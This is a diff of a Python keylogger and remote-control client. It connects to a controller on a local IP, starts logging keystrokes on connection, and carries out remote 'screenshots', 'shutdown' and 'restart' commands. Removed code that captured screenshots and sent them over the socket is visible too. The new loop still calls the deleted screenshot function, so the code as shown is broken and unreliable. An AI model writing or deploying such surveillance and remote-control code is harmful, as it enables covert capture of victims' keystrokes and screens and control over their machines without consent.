@@ -1,25 +1,24 @@
-from  pynput.keyboard import Listener
+from pynput.keyboard import Listener
 import socket
 import imutils
 import pyautogui
-import cv2
 from datetime import datetime
 import os
 
-clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
+clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-serverParrent = '192.168.1.22'
+serverParent = '192.168.1.10'
 serverPort = 8080
-clientSocket.connect((serverParrent, serverPort))
-
+try:
+    clientSocket.connect((serverParent, serverPort))
+except Exception as e:
+    print("Error connecting to server:", str(e))
 if clientSocket:
     print("connecting to server")
 
-messager = clientSocket.recv(1024).decode('utf-8')
-print("received" , messager)
-
 def on_press(key):
     try:
+        # clientSocket.send("hehe")
         key = str(key)
         key = key.replace("'", "")
         if key == "Key.f12":
@@ -28,35 +27,21 @@ def on_press(key):
     except Exception as e:
         print("Error: " + str(e))
 
-def takeScreenshot():
-    now = datetime.now()
-    nameScreen = "D:\\screenshot" + now.strftime("%H%M%S") + ".png"
-
-    # Chụp màn hình và lưu vào file ảnh
-    pyautogui.screenshot(nameScreen)
-
-    # Mở file ảnh ở chế độ đọc dạng byte
-    with open(nameScreen, "rb") as imageFile:
-        file_size = os.path.getsize(nameScreen)
-        # print(file_size)
-        clientSocket.send(str(file_size).encode())
-
-        # Gửi dữ liệu ảnh từ file
+# Start keylogger immediately upon connection
+with Listener(on_press=on_press) as parent:
+    try:
         while True:
-            data = imageFile.read(1024)
-            if not data:
-                break
-            clientSocket.send(data)
-
-
- 
-if messager == 'keylogger':
-    with  Listener(on_press =  on_press) as parent:         
+            message = clientSocket.recv(1024).decode('utf-8')
+            if message == 'screenshots':
+                takeScreenshot()
+            elif message == 'shutdown':
+                os.system("shutdown /s /t 1")
+            elif message == 'restart':
+                os.system("shutdown /r /t 1")
+    except Exception as e:
+        print("Error: " + str(e))
+    finally:
+        parent.stop()
         parent.join()
-elif messager == 'screenshots':
-    takeScreenshot()
-
-elif messager == 'shutdown':
-    os.system("shutdown /s /t 1")
-elif messager == 'restart':
-    os.system("shutdown /r /t 1")
+        
+        
